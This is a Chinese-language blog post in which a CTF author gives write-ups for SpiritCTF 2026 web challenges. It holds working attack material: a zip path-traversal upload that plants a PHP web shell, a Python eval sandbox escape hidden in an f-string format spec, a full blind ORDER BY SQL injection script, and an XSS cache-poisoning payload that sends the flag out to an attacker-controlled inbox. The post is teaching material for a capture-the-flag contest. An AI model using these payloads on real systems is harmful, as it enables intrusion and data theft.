---
title: "SpiritCTF 2026：Web 出题记录与题解"
description: "记录 SpiritCTF 2026 中本人设计的 Web 题目及部分题目的解题过程。"
publishDate: 2026-10-20T13:50:31.584Z
tags:
  - "ctf"
  - "web"
heroImage:
  src: ./spiritctf-2026-web-writeup.assets/city-light.jpg
  color: "#282838"
  alt: SpiritCTF2026 Web 出题记录与题解
language: 'zh-CN'
draft: false
slug: spiritctf-2026-web-writeup
---

> 这次比赛线下断网，大部分选手也没什么基础，感觉有点出难了

<github-card data-repo="residream/2026-SpiritCTF-Web"><a href="https://github.com/residream/2026-SpiritCTF-Web">2026 SpiritCTF · Web 题目源码与题解</a></github-card>

## 神奇的请求头

学长出的签到题，按照要求改请求方式和 http header 即可，最后好像是 POST 请求，设置 User-Agent 为 Spirit ，设置 Referer 为 JLU 即可

## login？

> 我出的签到 (? 题但最后只有三解，然后后面三道都是零解，我勒个豆啊

进入网页后是登陆界面，尝试登陆发现没反应

抓包发现登陆后返回

```http
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Date: Fri, 16 Oct 2026 05:49:32 GMT
Location: /login.php
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.35
Content-Length: 554

<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <title>素材导入后台</title>
</head>
<body>
  <h1>素材导入后台</h1>
  <p>上传 ZIP，自动解压归档并返回导入报告。</p>
  <form action="/upload_aa99bc42bc4e.php" method="post" enctype="multipart/form-data">
    <p><label>选择压缩包：<input type="file" name="archive" accept=".zip" required></label></p>
    <p><button type="submit">上传并解压</button></p>
  </form>
  <p><a href="/make_sample.py" download>下载示例脚本</a></p>
</body>
</html>
```

body 泄漏，发现 admin 后台有 `/upload_aa99bc42bc4e.php` 上传压缩包接口和 `/make_sample.py` 下载示例脚本接口

下载示例脚本发现为：

```python
import zipfile

#小 r 感觉直接用脚本生成示例压缩包然后 curl 上传更方便呢
#curl http://localhost:3000 -F "archive=@sample.zip"
with zipfile.ZipFile("sample.zip", "w") as z:
    z.writestr("notes.txt", "这是示例素材包。\n系统会保留内部目录结构进行解压归档。\n")
    z.writestr("images/cover.txt", "封面占位")
```

我甚至都给了文件上传的 curl 命令（

生成示例压缩包后上传，返回得到

```json
{
    "id": "f21c77",
    "status": "completed",
    "workspace": "/var/www/storage/f21c77",
    "files": [
        {
            "entry": "notes.txt",
            "stored_as": "/var/www/storage/f21c77/notes.txt",
            "size": 80,
            "status": "written"
        },
        {
            "entry": "images/cover.txt",
            "stored_as": "/var/www/storage/f21c77/images/cover.txt",
            "size": 12,
            "status": "written"
        }
    ]
}
```

返回信息如此详细，尝试写一句话木马解压后路径穿越以达成 RCE

```python
import zipfile

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("../../html/evil.php", "<?php system($_GET['c']); ?>")
```

```
Warning: Undefined array key "c" in /var/www/html/evil.php on line 1

Deprecated: system(): Passing null to parameter #1 ($command) of type string is deprecated in /var/www/html/evil.php on line 1

Fatal error: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/evil.php:1 Stack trace: #0 /var/www/html/evil.php(1): system('') #1 {main} thrown in /var/www/html/evil.php on line 1
```

成功 RCE ，在根目录下找到 flag

```
/evil.php?c=cat%20/flag

SpiritCTF{IOGin-10okS-I0CkEd-6Ut_zlP_5llPS-iNTo-DocrOoT0}
```

## gpa-calculator

题目描述称：

```
小 r 非常“喜欢”吉吉大学的绩点制度，其拥有非常 amazing 的小数点“不四舍五入”机制，总是能意想不到的给予自己一些“惊喜”
为此，初学 Python 的他写了一个绩点计算器部署到服务器上，这个小工具支持手动录入成绩、导入 xlsx 成绩单，还能自定义成绩报告的显示格式
不过为了防止大家乱写表达式，小 r “认真”加了一套检查器（？
你能找出其中的漏洞吗？
```

能注意到题目是个 gpa 计算器的网页，检查器大概是重点

### 审计代码

附件解压后可以看到一个 Flask 写的 GPA Calculator 项目

`Dockerfile` 用来构建题目环境，安装 Flask、gunicorn、defusedxml 等依赖，并以非 root 用户运行服务。启动命令为：

```dockerfile
CMD ["gunicorn", "--config", "gunicorn.conf.py", "app:create_app()"]
```

说明 Web 入口在 `app.py` 的 `create_app()`

`entrypoint.sh` ：

```sh
flag_value=$FLAG
unset FLAG

umask 077
printf '%s' "$flag_value" > /tmp/flag
```

可以看到容器启动时会把环境变量 `FLAG` 写入 `/tmp/flag`，并且随后清空环境变量。因此后续目标应该是想办法读取 `/tmp/flag`

`compose.yml` 是本地测试用的 Docker Compose 配置，开放 `3000` 端口

`app.py` ：

Flask 主入口，定义了几个路由：

```python
@app.get("/")
def index():
    return render_template("index.html", default_expression=DEFAULT_EXPRESSION)
```

首页会渲染前端页面，并传入一个默认表达式：

```python
DEFAULT_EXPRESSION = 'f"加权 GPA：{gpa:.2f}\\n平均分：{avg_score:.2f}\\n总学分：{credits:.1f}\\n课程数：{course_count}"'
#小 r 发现这里还可以写 f"加权 GPA：{gpa:.{1+1}f}\\n平均分：{avg_score:.{1+1}f}\\n总学分：{credits:.{1+1}f}\\n课程数：{course_count}"
#既然这里可以执行参数，那这样以后改成可选精确值就方便多了呀！
#不过这种事情还是留给以后吧！
MAX_UPLOAD_BYTES = 2 * 1024 * 1024
```

这说明题目的“自定义成绩报告”本质上是让用户提交一段 Python 表达式

然后我这里直接注释指出这里可以在格式化字符串内部执行表达式（

继续看 `/api/calculate`：

```python
@app.post("/api/calculate")
def calculate():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return jsonify({"ok": False, "error_type": "BadRequest", "error": "json object required"}), 400

    try:
        courses = validate_courses(data.get("courses"))
        expression = data.get("expression") or DEFAULT_EXPRESSION
        summary = calculate_summary(courses)
        context = build_expression_context(summary)
    except ValueError as exc:
        return jsonify({"ok": False, "error_type": "BadRequest", "error": str(exc)}), 400

    result = run_expression(expression, context)
    status = 200 if result["ok"] else 400
    return jsonify({"courses": courses, "summary": summary, **result}), status
```

这里会接收用户提交的课程数据和 `expression`，先计算 GPA，再把表达式交给 `run_expression()` 执行

`gpa.py` ：

负责 GPA 业务计算，包括课程校验、成绩转绩点、加权平均等，比如：

```python
GRADE_POINTS = {
    "优秀": 4.0,
    "良好": 3.3,
    "中等": 2.3,
    "及格": 1.3,
    "不及格": 0.0
}

GRADE_SCORES = {
    "优秀": 95.0,
    "良好": 85.0,
    "中等": 75.0,
    "及格": 65.0,
    "不及格": 0.0,
}
```

`build_expression_context()` 会把计算结果整理成表达式能使用的变量：

```python
def build_expression_context(summary):
    return {
        "gpa": float(summary["gpa"]),
        "avg_score": float(summary["avg_score"]),
        "credits": float(summary["credits"]),
        "course_count": int(summary["course_count"]),
        "student_name": "guest",
    }
```

也就是说，正常情况下表达式里只能直接使用 `gpa`、`avg_score`、`credits`、`course_count`、`student_name` 这些变量

`xlsx_import.py` ：

负责解析上传的 xlsx 成绩单，它会读取表格中的课程名、学分、成绩等字段，然后转换成课程列表

这里虽然代码比较长，但主要是业务功能，用来支持题目描述中的“导入 xlsx 成绩单”

`runner.py` ：

```python
def run_expression(expression, context):
    try:
        tree = parse_and_check(expression, context.keys())
        code = compile(tree, "<report>", "eval")
        namespace = dict(context)
        namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
        value = eval(code, {"__builtins__": {}}, namespace)
        return {"ok": True, "result": str(value)[:MAX_OUTPUT]}
    except ExpressionRejected as exc:
        return {"ok": False, "error_type": "Rejected", "error": str(exc)}
    except Exception as exc:
        return {"ok": False, "error_type": exc.__class__.__name__, "error": str(exc)[:MAX_OUTPUT]}
```

这里流程非常直接：

1. 先调用 `parse_and_check()` 检查表达式
2. 检查通过后 `compile()`
3. 构造执行命名空间
4. 额外加入一个 `report` 对象
5. 最后用 `eval()` 执行

虽然 `eval()` 的全局变量中传入了空的 `__builtins__` ：

```python
eval(code, {"__builtins__": {}}, namespace)
```

但只要能通过对象链重新摸到 Python 的全局变量或内置函数，仍然有机会逃逸

而 `report.py` 中定义了被注入的 `ReportFormatter` ：

```python
class ReportFormatter:
    def __init__(self, student="guest"):
        self.student = student
```

这个类本身看起来只是用于渲染报告，但因为 `runner.py` 把它的实例放进了表达式环境：

```python
namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
```

所以表达式里可以访问 `report` 这个对象，Python 中函数对象通常可以通过 `__globals__` 访问其定义时所在模块的全局命名空间，因此 `report` 很可能会成为后续利用的突破口

最后看真正的检查器 `checker.py` ：

```python
MAX_EXPRESSION_LENGTH = 2048

BLOCK_WORDS = (
    "__globals__",
    "__builtins__",
    "__subclasses__",
    "__import__",
)
```

首先它限制了表达式长度，并且过滤了几个比较敏感的字符串

这里直接写 `__globals__` 、`__builtins__` 、`__subclasses__` 、`__import__` 都会被拦掉

继续看允许的 AST 节点：

```python
ALLOWED_NODES = {
    ast.Expression,
    ast.Constant,
    ast.Name,
    ast.Load,
    ast.JoinedStr,
    ast.FormattedValue,
    ast.BinOp,
    ast.UnaryOp,
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.Div,
    ast.FloorDiv,
    ast.Mod,
    ast.Pow,
    ast.UAdd,
    ast.USub,
}
```

这里可以发现，`Call` 、`Attribute` 、`Subscript` 都不在白名单里，也就是说，正常情况下不能调用函数，不能访问属性，也不能用下标取值

比如类似下面的表达式都应该无法通过检查：

```python
open("/tmp/flag").read()
```

```python
report.__init__
```

因为它们分别会产生 `Call`、`Attribute` 这类 AST 节点

再看具体的检查逻辑：

```python
class ReportExpressionChecker(ast.NodeVisitor):
    def __init__(self, allowed_names):
        self.allowed_names = set(allowed_names)

    def visit(self, node):
        if type(node) not in ALLOWED_NODES:
            raise ExpressionRejected(f"{type(node).__name__} is not allowed")
        return super().visit(node)

    def visit_Name(self, node):
        if node.id not in self.allowed_names:
            raise ExpressionRejected(f"name {node.id!r} is not available")

    def visit_Constant(self, node):
        if not isinstance(node.value, (int, float, str)):
            raise ExpressionRejected(f"constant {node.value!r} is not allowed")

    def visit_FormattedValue(self, node):
        self.visit(node.value)
```

`visit()` 会检查节点类型是否在白名单里，`visit_Name()` 会检查变量名是否在允许列表中

在 `runner.py` 中调用检查器时：

```python
tree = parse_and_check(expression, context.keys())
```

这里传入的 `allowed_names` 来自 `context.keys()` ，也就是：

```
gpa
avg_score
credits
course_count
student_name
```

注意此时 `report` 还没有被加入允许列表。`report` 是检查完成之后才加入执行命名空间的：

```python
namespace = dict(context)
namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
```

所以正常情况下，表达式中直接写 `report` 也应该被拦住

继续看最关键的地方：

```python
def visit_FormattedValue(self, node):
    self.visit(node.value)
```

这里是漏洞点

### 漏洞分析

一开始准备让大家自己分析这个漏洞，不过上题前觉得这个点可能有点雷霆所以注释直接写明了，虽然好像并没有什么用（

不过这里还是分析一下吧：

在 Python 的 f-string 里，`{}` 中的内容会被解析成 `FormattedValue` ，例如：

```python
f"{gpa:.2f}"
```

其中 `gpa` 是要格式化的值，`.2f` 是格式说明符，也就是 `format_spec`

对于更复杂的 f-string，格式说明符里面也可以嵌入表达式，例如：

```python
f"{gpa:{'.2f'.strip()}}"
```

这里外层要格式化的是 `gpa` ，但是格式说明符里面又执行了：

```python
'.2f'.strip()
```

也就是说，f-string 的 `format_spec` 里同样可以出现表达式

但是题目中的检查器只检查了：

```python
self.visit(node.value)
```

也就是只检查了被格式化的主体，没有继续检查 `node.format_spec`

因此如果把危险表达式藏到 `format_spec` 里面，AST 检查器就看不到它

可以先用一个简单表达式验证：

```python
f"{gpa:{'.2f'.strip()}}"
```

这条表达式中，`'.2f'.strip()` 明显包含函数调用和属性访问，正常来说应该被 `Call` 和 `Attribute` 拦住。但由于它位于 `format_spec` 中，没有被检查器访问，所以可以正常执行

接下来就可以把利用点放进 `format_spec` 里

目标是读取 `/tmp/flag` ，前面已经看到 `runner.py` 会在运行时加入一个 `report` 对象：

```python
namespace["report"] = ReportFormatter(...)
```

而 `report` 是 `ReportFormatter` 的实例，可以通过它的方法对象继续拿到函数全局变量，正常思路是：

```python
report.__init__.__globals__
```

但是直接写会被黑名单中的 `__globals__` 拦住，所以需要字符串拼接绕过：

```python
'__glo' + 'bals__'
```

由于不能直接写 `report.__init__.__globals__` ，可以使用函数对象自带的 `__getattribute__` 方法取属性：

```python
report.__init__.__getattribute__('__glo' + 'bals__')
```

拿到 globals 之后，再取 `__builtins__` ，同样因为 `__builtins__` 被黑名单拦住，所以继续拼接：

```python
['__buil' + 'tins__']
```

再从 builtins 中取 `open` ，这里也可以拼接一下：

```python
['op' + 'en']
```

于是读取 flag 的核心表达式为：

```python
report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()
```

但是这段表达式不能直接放在外层，因为外层会被 AST 检查器检查。我们需要把它塞进 f-string 的 `format_spec` 里：

```python
f"{0:{report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()}}"
```

这条 payload 的结构是：

```python
f"{0:{payload}}"
```

外层真正被格式化的值是 `0` ，检查器只会检查这个 `0` ，它是一个普通常量，可以通过

而里面的 `payload` 位于 `format_spec` ，不会被检查器访问，但运行时仍然会被 Python 执行

执行后，`/tmp/flag` 的内容会被当成格式说明符。由于 flag 显然不是合法的格式说明符，所以会触发异常，例如：

```
Invalid format specifier 'flag{fake_for_local_test}' for object of type 'int'
```

题目会把异常信息返回给前端：

```python
except Exception as exc:
    return {"ok": False, "error_type": exc.__class__.__name__, "error": str(exc)[:MAX_OUTPUT]}
```

因此 flag 会通过报错信息回显出来

最终 payload：

```
f"{0:{report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()}}"
```

flag：

```
[ValueError] Invalid format specifier 'SpiritCTF{VISlt_F0rMATTEDvALu3-fORGoT_FoRm4T-SPec1b9d}' for object of type 'int'
```

## 秘密便签

> 我这二次 sql 的 order by 盲注真有意思吧（

dirsearch 扫出 robots.txt

```
User-agent: *
Disallow: /archive/deploy-notes.txt
```

访问得到账户密码

```
秘密便签 / 部署交接记录
更新时间: 2026-10-15T11:13:02Z
登录账号: admin
临时登录密码: 019c8326ec8d1ffce65c5ec405cdefcd
登录密码与便签锁口令分别管理。
归档仅供部署交接，搜索引擎请勿收录。
```

成功登陆进网页

存在私密记录，被口令锁住了不让看

可以新建便签

可以选择排序偏好来给主界面展示的便签排序

题目给了源码，开始审计

```dockerfile
# 开发环境用于本地测试，线上部署为生产环境
ENV NODE_ENV=development
```

线下为开发环境，线上为生产环境，如果在本地 docker 构建来测试的话密码固定为 `local-dev-password` ，flag 固定为 `flag{fake_for_local_test}`  ，方便本地测试

```js
const DEV_ADMIN_PASSWORD = 'local-dev-password';

function initialize(db, flag) {
  const adminPassword = process.env.ADMIN_PASSWORD
    || (process.env.NODE_ENV === 'production' ? null : DEV_ADMIN_PASSWORD);
```

```javascript
const flag = process.env.FLAG
  ?? (process.env.NODE_ENV === 'production' ? null : 'flag{fake_for_local_test}');
```

发现 flag 被锁在私密便签中，密码是随机生成后哈希的，打密码这条路不可取

```javascript
const lockHash = hashPassword(crypto.randomBytes(16).toString('hex'));
```

不过 flag 明文存储在 `notes` 表中，对应为 `notes.body`

```javascript
const secretNote = db.prepare('SELECT id FROM notes WHERE owner_id = ? AND system_note = ?').get(1, 1);
if (secretNote) {
  db.prepare('UPDATE notes SET body = ?, locked = ?, lock_hash = ? WHERE id = ?')
    .run(flag, 1, lockHash, secretNote.id);
} else {
  db.prepare(`INSERT INTO notes (owner_id, title, body, priority, locked, lock_hash, system_note, created_at)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?)`)
    .run(1, '私密记录', flag, 2, 1, lockHash, 1, '2026-10-06T14:48:00.000Z');
}
```

注意到 `/notes` 路由的 `sort_field` 和 `sort_dir` 没做参数化， `sort_field` 和 `sort_dir` 来自 `users` 表，不过 `ORDER BY` 的列名或表达式本来就不能参数化，因为占位符只能绑值，不能绑标识符。这里采用了字符串拼接，关键是拼接的字段或表达式必须经过白名单限制，不能直接使用用户输入

```javascript
router.get('/notes', requireLogin, (req, res) => {
  const { sort_field, sort_dir } = db.prepare('SELECT sort_field, sort_dir FROM users WHERE id = ?').get(req.currentUser.id);
  let list;
  try {
    list = db.prepare(
      `SELECT id, title, priority, locked, created_at
       FROM notes
       WHERE owner_id = ?
       ORDER BY ${sort_field} ${sort_dir}, id ASC`
    ).all(req.currentUser.id);
  } catch {
    if (wantsJson(req)) return res.status(400).json({ error: '排序偏好暂时不可用，请重新设置。' });
    return res.page('error', { title: '无法排列便签', nav: 'notes', code: 400, message: '排序偏好暂时不可用，请到排序设置中重新保存。', settingsLink: true }, 400);
  }
  if (wantsJson(req)) return res.json({ notes: list });
  res.page('notes', { title: '我的便签', nav: 'notes', notes: list, feedback: takeNotice(req) });
});
```

不过继续追踪 `sort_field` 和 `sort_dir` 的来源，发现 `dir` 做了白名单，只能为 `asc` 或 `desc` ，但 `field` 没做白名单，直接拿了请求 `req.body.sort_field.trim()` 的值，然后查了一下非空、校验了一下 `SORT_FIELD_MAX` 就没了

```javascript
router.post('/settings', requireLogin, (req, res) => {
  const field = typeof req.body.sort_field === 'string' ? req.body.sort_field.trim() : '';
  const dir = req.body.sort_dir === 'asc' ? 'asc' : 'desc';
  if (!field || field.length > SORT_FIELD_MAX) {
    return res.page('settings', { title: '排序偏好', nav: 'settings', sortField: 'created_at', sortDir: 'desc', feedback: feedback('请选择排序方式。') }, 400);
  }
  db.prepare('UPDATE users SET sort_field = ?, sort_dir = ? WHERE id = ?').run(field, dir, req.currentUser.id);
  req.session.notice = '排序偏好已保存。';
  res.redirect(303, '/settings');
});
```

因此这里存在二次注入，先污染 `users` 表，再注入进 `/notes` 路由影响排序顺序，根据逐字符比对并观察首页的顺序来爆破出以明文存储的 flag

具体思路就是创建两个参考便签，先创建的为 a!@# ，id 较小，后创建的为 b!@# ，id 较大，然后我们可以注入，使得 SQL 语句类似为：

```sql
ORDER BY CASE WHEN ((SELECT unicode(substr(body,i,1)) FROM notes WHERE owner_id = 1 AND locked = 1 LIMIT 1) > j) THEN id ELSE -id END ASC, id ASC
```

这样控制 j 可以二分查找爆出 i 的字符为多少，然后一步步爆破出全部内容

**exp.py**

```python
import requests

base = "https://edi4cx2o5onw.challenge.jlu-terminal.site"

s = requests.Session()

s.cookies.set("secret_notes.sid","s%3AkR4ogR85p4Tf86RQseSLtKcqYqHVQp2K.i3Vg6MSPTZAiFRB4xvqY3D9kLb3Slq9zKUUUL2Y6nFg")

def oracle(pos, mid):
    r1 = s.post(f"{base}/settings",
                data={
                    "sort_field":f"CASE WHEN ((SELECT unicode(substr(body,{pos},1)) FROM notes WHERE owner_id = 1 AND locked = 1 LIMIT 1) > {mid}) THEN id ELSE -id END",
                    "sort_dir":"asc"
                }
                )
    r2 = s.get(f"{base}/notes")

    return r2.text.find("a!@#")<r2.text.find("b!@#")


flag = ""

for pos in range(1,101):
    left, right = 0, 127

    while(left < right):
        mid = (left + right) // 2
        if oracle(pos, mid):
            left = mid + 1
        else:
            right = mid

    if left == 0:
        break

    flag += chr(left)
    print(flag)

print()
print("Flag:", flag)
```

```
S
Sp
Spi
Spir
Spiri
Spirit
SpiritC
SpiritCT
SpiritCTF
SpiritCTF{
SpiritCTF{0
SpiritCTF{0R
SpiritCTF{0Rd
SpiritCTF{0Rde
SpiritCTF{0RdeR
SpiritCTF{0RdeR_
SpiritCTF{0RdeR_B
SpiritCTF{0RdeR_By
SpiritCTF{0RdeR_By-
SpiritCTF{0RdeR_By-b
SpiritCTF{0RdeR_By-bL
SpiritCTF{0RdeR_By-bLl
SpiritCTF{0RdeR_By-bLln
SpiritCTF{0RdeR_By-bLlnD
SpiritCTF{0RdeR_By-bLlnD-
SpiritCTF{0RdeR_By-bLlnD-S
SpiritCTF{0RdeR_By-bLlnD-Sq
SpiritCTF{0RdeR_By-bLlnD-SqI
SpiritCTF{0RdeR_By-bLlnD-SqIi
SpiritCTF{0RdeR_By-bLlnD-SqIi6
SpiritCTF{0RdeR_By-bLlnD-SqIi6d
SpiritCTF{0RdeR_By-bLlnD-SqIi6d7
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77
SpiritCTF{0RdeR_By-bLlnD-SqIi6d775
SpiritCTF{0RdeR_By-bLlnD-SqIi6d7755
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559a
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af}

Flag: SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af}
```

## Xssr

> 学长出的浏览器缓存搭配 XSS 的题，这 XSS 甚至给了源码，难度可想而知，反正都快给我创飞了，需要代码审计浏览器的缓存逻辑，不过因为不是我出的所以这里只写了我写这道题过程中的记录

```
preview：

/
返回preview.html

/render
要GET
要x-preview:1
要html参数

/flag
要admintoken
```

```
desk：

GET
/p/
返回document.html(被save的

GET/POST
/inbox/
url.search写进inbox
```

```
preview.html:

会fetch /render并带上x-preview再显示
```

```
browser：

key取method和url

get取缓存，要求GET

put存缓存，要求GET，cache-control不是no-store或no-cache，没有set-cookie

cache在get后直接return response了
```

```
烧脑：

bot带admintoken，review可以让bot看网页

save可以写document.html，可以有xss，但是都是在desk下，review触发xss也被限制在desk下

所以要尝试在preview下触发xss

preview下的/render?html=有xss，但要x-preview

preview下的/也会fetch /render...，但sandbox为空，拦了xss

bot访问preview.test/?html虽然xss被拦但能触发存缓存，此时再访问preview.test/render?html是直接触发取缓存然后直接return response，就能触发在/render下的xss了
```

payload：

```html
<script>
const inner='<script>fetch("http://preview.test/flag",{credentials:"include"}).then(r=>r.text()).then(f=>new Image().src="http://desk.test/inbox/2fa7e3490cb09ab6b0bcde9b?flag="+encodeURIComponent(f))<\/script>'
const p=encodeURIComponent(inner)
window.open('http://preview.test?html='+p)
setTimeout(()=>{window.open('http://preview.test/render?html='+p);},2500)
</script>
```

```
[
  {
    "at": "2026-10-13T14:26:18.180Z",
    "query": "flag=SpiritCTF%7BC%40cHE_xS5-bYPA5523c57c90f35%7D",
    "body": ""
  }
]
```
